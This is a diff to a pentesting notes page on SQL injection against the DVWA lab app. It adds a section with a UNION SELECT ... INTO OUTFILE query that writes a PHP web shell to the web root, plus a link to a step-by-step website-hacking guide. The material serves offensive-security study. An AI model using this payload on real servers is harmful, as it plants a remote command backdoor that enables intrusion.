@@ -37,6 +37,14 @@ mysql> insert into accounts (username, password, mysignature) values ('admin','m
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-16-57-24.png)
 
+### Dropping a Backdoor
+
+```sql
+mysql> select * from users where user_id = 1 union select all 1,2,3,4,"<?php system($_REQUEST['c']);?>",6 into outfile "/var/www/dvwa/shell.php" #;
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-17-19-15-16.png)
+
 ## Time Based SQL Injection
 
 ### Sleep Invokation
@@ -58,6 +66,8 @@ select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
 {% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" %}
 
 {% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}
+
+{% embed url="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" %}
 
 {% embed url="https://www.youtube.com/watch?v=Rqt\_BgG5YyI" %}
 
